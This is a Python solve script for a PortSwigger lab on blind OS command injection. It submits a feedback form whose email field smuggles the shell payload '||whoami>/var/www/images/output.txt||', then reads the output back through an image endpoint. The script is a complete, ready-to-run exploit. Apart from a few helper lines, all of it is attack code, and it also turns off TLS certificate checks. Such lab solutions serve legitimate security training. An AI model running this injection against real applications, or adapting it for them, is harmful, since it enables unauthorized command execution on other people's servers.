#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab:
Blind OS command injection with output redirection.

Submits feedback with `email=||whoami>/var/www/images/output.txt||`, then
fetches /image?filename=output.txt to retrieve the whoami output.
"""

import argparse
import re
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def grab_csrf(session: requests.Session, lab: str) -> str:
    r = session.get(f"{lab}/feedback")
    m = re.search(r'name="csrf" value="([^"]+)"', r.text)
    if not m:
        raise SystemExit("[-] CSRF token not found")
    return m.group(1)


def inject(session: requests.Session, lab: str) -> None:
    csrf = grab_csrf(session, lab)
    payload = "||whoami>/var/www/images/output.txt||"
    data = {
        "csrf": csrf,
        "name": "x",
        "email": payload,
        "subject": "x",
        "message": "x",
    }
    r = session.post(f"{lab}/feedback/submit", data=data)
    print(f"[*] Feedback submit status: {r.status_code}")


def retrieve(session: requests.Session, lab: str) -> str:
    r = session.get(f"{lab}/image", params={"filename": "output.txt"})
    print(f"[*] Image endpoint status: {r.status_code}")
    return r.text.strip()


def main():
    parser = argparse.ArgumentParser(
        description="Solve OS Command Injection Lab 3 (blind output redirection)"
    )
    parser.add_argument("lab_url", help="Lab URL")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    print("[*] Injecting whoami > output.txt")
    inject(s, lab)

    print("[*] Fetching output.txt via /image")
    output = retrieve(s, lab)

    if output and len(output) < 200:
        print(f"\n[+] whoami output: {output}")
        print("[+] Lab solved.")
    else:
        print(f"\n[-] Unexpected response:\n{output[:500]}")


if __name__ == "__main__":
    main()
